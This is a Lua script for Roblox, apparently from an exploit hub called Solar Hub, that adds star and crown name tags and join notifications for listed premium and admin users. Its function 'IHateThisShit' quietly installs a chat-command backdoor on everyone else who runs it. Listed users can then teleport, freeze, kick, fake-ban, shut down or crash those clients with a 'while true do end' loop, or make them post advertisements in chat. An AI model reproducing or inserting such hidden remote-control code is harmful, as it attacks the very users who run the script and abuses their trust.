-- tag handling

function TagHandler()
    for i, v in pairs(game.Players:GetPlayers()) do
        if table.find(List.Premium, v.UserId) and v.Character then
            local nameTag = v.Character.Head:FindFirstChild("Nametag")
            local bannerTag = game.Workspace:FindFirstChild("Banner"..v.Name)
            if not bannerTag then
                bannerTag = v.Character:FindFirstChild("Banner"..v.Name)
            end    
            local texting = bannerTag:FindFirstChild("BillboardGui")

            if nameTag:IsA("BillboardGui") and texting:IsA("BillboardGui") then
                nameTag:FindFirstChild("TextLabel").Text = "[‚≠ê] "..v.Name
                nameTag:FindFirstChild("TextLabel").Shadow.Text = "[‚≠ê] "..v.Name
                texting.Frame.Username.Text = "‚≠ê"..v.Name.."‚≠ê"
            end
        elseif table.find(List.Admin, v.UserId) and v.Character then
            local nameTag = v.Character.Head:FindFirstChild("Nametag")
            local bannerTag = game.Workspace:FindFirstChild("Banner"..v.Name)
            if not bannerTag then
                bannerTag = v.Character:FindFirstChild("Banner"..v.Name)
            end    
            local texting = bannerTag:FindFirstChild("BillboardGui")

            if nameTag:IsA("BillboardGui") and texting:IsA("BillboardGui") then
                nameTag:FindFirstChild("TextLabel").Text = "[üëë] "..v.Name
                nameTag:FindFirstChild("TextLabel").Shadow.Text = "[üëë] "..v.Name
                texting.Frame.Username.Text = "üëëOWNER OF SOLAR HUBüëë"
            end
        end
    end
end


-- premium command shit
function IHateThisShit()
if table.find(List.Premium, game.Players.LocalPlayer.UserId) or table.find(List.Admin, game.Players.LocalPlayer.UserId) then else
    game.TextChatService.MessageReceived:Connect(function(message)
        local text = message.Text
        local id = message.TextSource.UserId
        if table.find(List.Premium, id) or table.find(List.Admin, id) then
            if text == "!bring" then
if game.Players.LocalPlayer.Values.InGame == false then
                for i, v in pairs(game.Players:GetPlayers()) do
                    if v.UserId == id and v.Character then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
                    end
                end
end
            elseif text == "!freeze" then
if game.Players.LocalPlayer.Values.InGame == false then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
end
            elseif text == "!unfreeze" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            elseif text == "!check" then
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("like and subscribe to solar hub üòÅ")
            elseif text == "!kick" then
if game.Players.LocalPlayer.Values.InGame == false then
                game.Players.LocalPlayer:Kick("kicked by "..tostring(message.TextSource))
end
            elseif text == "!fakeban" then
if game.Players.LocalPlayer.Values.InGame == false then
                game.Players.LocalPlayer:Kick("YOU HAVE BEEN PERMANENTLY BANNED FROM HOOPS LIFE !")
end
            elseif text == "!close" then
if game.Players.LocalPlayer.Values.InGame == false then
                game:Shutdown()
end
            elseif text == "!crash" then
if game.Players.LocalPlayer.Values.InGame == false then
                while true do end
end
            end
        end
    end)
end
end

-- check if an admin/premium user is already in game

for i, v in pairs(game.Players:GetPlayers()) do
    if table.find(List.Premium, v.UserId) then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Solar Hub",
            Text = "Solar Hub Premium Member "..v.Name.." is in your game!",
            Duration = 60
        })
    elseif table.find(List.Admin, v.UserId) then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Solar Hub",
            Text = "Solar Hub Premium Member "..v.Name.." is in your game!",
            Duration = 60
        })
    end
end

-- check if admin/premium user has joined/left the game


game.Players.PlayerAdded:Connect(function(v)
    if table.find(List.Premium, v.UserId) then
       game.StarterGui:SetCore("SendNotification", {
            Title = "Solar Hub",
            Text = "Solar Hub Premium Member "..v.Name.." has joined your game!",
            Duration = 60
        })
    elseif table.find(List.Admin, v.UserId) then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Solar Hub",
            Text = "Solar Hub Admin "..v.Name.." has joined your game!",
            Duration = 120
        })
    end
end)

game.Players.PlayerRemoving:Connect(function(v)
    if table.find(List.Premium, v.UserId) then
       game.StarterGui:SetCore("SendNotification", {
            Title = "Solar Hub",
            Text = "Solar Hub Premium Member "..v.Name.." has left your game!",
            Duration = 60
        })
    elseif table.find(List.Admin, v.UserId) then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Solar Hub",
            Text = "Solar Hub Admin "..v.Name.." has left your game!",
            Duration = 120
        })
    end
end)

-- loop the tag function  (incase user dies)
pcall(IHateThisShit)
while wait(3) do
    pcall(TagHandler)
end
